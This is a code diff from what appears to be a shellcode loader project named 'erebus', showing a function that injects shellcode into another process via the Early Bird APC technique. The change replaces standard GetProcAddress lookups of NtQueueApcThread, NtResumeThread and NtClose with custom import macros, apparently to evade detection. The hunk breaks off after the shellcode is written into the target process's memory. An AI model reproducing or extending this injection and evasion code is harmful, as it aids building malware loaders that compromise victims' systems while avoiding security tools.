@@ -1,18 +1,18 @@
 #include "../../include/loader.hpp"
 
 namespace erebus {
-#if CONFIG_INJECTION_TYPE == 4
+#if CONFIG_INJECTION_TYPE == 3
 	VOID InjectionEarlyCascade(IN BYTE* shellcode, IN SIZE_T shellcode_size, IN HANDLE hProcess, IN HANDLE hThread)
 	{
 		LOG_INFO("Injection via. EarlyCascade (Early Bird APC)");
 
 		PVOID base_address = NULL;
 
-		HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+		HMODULE ntdll = ImportModule("ntdll.dll");
 		if (!ntdll) { LOG_ERROR("Failed to get ntdll.dll"); return; }
-		typeNtQueueApcThread NtQueueApcThread = (typeNtQueueApcThread)GetProcAddress(ntdll, "NtQueueApcThread");
-		typeNtResumeThread NtResumeThread = (typeNtResumeThread)GetProcAddress(ntdll, "NtResumeThread");
-		typeNtClose NtClose = (typeNtClose)GetProcAddress(ntdll, "NtClose");
+		ImportFunction(ntdll, NtQueueApcThread, typeNtQueueApcThread);
+		ImportFunction(ntdll, NtResumeThread, typeNtResumeThread);
+		ImportFunction(ntdll, NtClose, typeNtClose);
 
 		base_address = erebus::WriteShellcodeInMemory(hProcess, shellcode, shellcode_size);
 		if (base_address == NULL) {
